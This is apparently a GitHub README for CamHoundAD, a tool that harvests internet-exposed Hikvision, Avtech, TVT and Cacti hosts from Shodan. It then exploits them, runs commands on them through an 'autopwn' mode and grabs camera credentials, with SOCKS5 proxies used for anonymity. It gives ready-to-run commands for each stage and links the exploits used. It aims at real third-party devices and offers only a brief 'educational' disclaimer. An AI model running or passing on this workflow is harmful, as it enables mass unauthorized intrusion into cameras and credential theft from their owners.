# CamHoundAD

<a href="https://github.com/byt3n33dl3/CamHoundAD/"><p align="center">
<img src="/screenshots/cctv.jpg">
</p></a>

This is a tool meant to assist **Cyber Security** researchers on discovering outdated and vulnerable camera systems on the internet by utilizing [shodan.io](shodan.io). I was able to discover thousands of vulnerable cameras using it. It could be for Cammera Attacks research, CCTV's Attacks research, etc.

# Vendors Affected

>- [+] Hikvision

>- [+] Nikon

>- [+] Avtech

>- [+] GoPro

>- [+] TVT

>- [+] Cacti

Coming Soon . . .

# Features

- Fetching of hosts from shodan.io
   - [Attacks Key](shodan.io)
- Check for vulnerable cameras
- Automatically run commands on exploited Devices
- Automatically grab camera credentials
- Multi-threading for faster scanning
- Usage of Socks5 proxies for anonymity
- Storing results in Sqlite3 database
- Logging all actions in log files 

# Prerequisites

To use this tool you need to have the following:
- Shodan API Key
- Socks5 authenticated proxies

# Installation

```python
git clone https://github.com/byt3n33dl3/CamHoundAD
pip install -r requirements.txt
python3 scanner.py --help
```

# Usage

## Collect hosts in database

```python
# Collect Hikvision hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'product:"Hikvision IP Camera"' --pages 1

# Collect Avtech hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'linux upnp avtech' --pages 1

# Collect TVT hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'product:"Cross Web Server"' --pages 1

# Collect Cacti hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'Login to Cacti' --pages 1
```

## Check hosts for exploit

```python
python3 scanner.py --check --proxy-file proxies.txt --threads 20
```

## Automatically run command on exploited hosts

```python
python3 scanner.py --autopwn --proxy-file proxies.txt --payload "id"
```

# About CamHoundAD

This tool is purely educational and is inteded to make the internet more secure. **I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.** Any PR's or suggestions on improving this project are welcome

## Exploits Used

[[+] Exploit-db](https://www.exploit-db.com/exploits/40500)

[[+] Exploit-db](https://www.exploit-db.com/exploits/50441)

[[+] RCE](https://github.com/k1p0d/h264_dvr_rce)

[[+] CVE](https://github.com/sAsPeCt488/CVE-2022-46169)
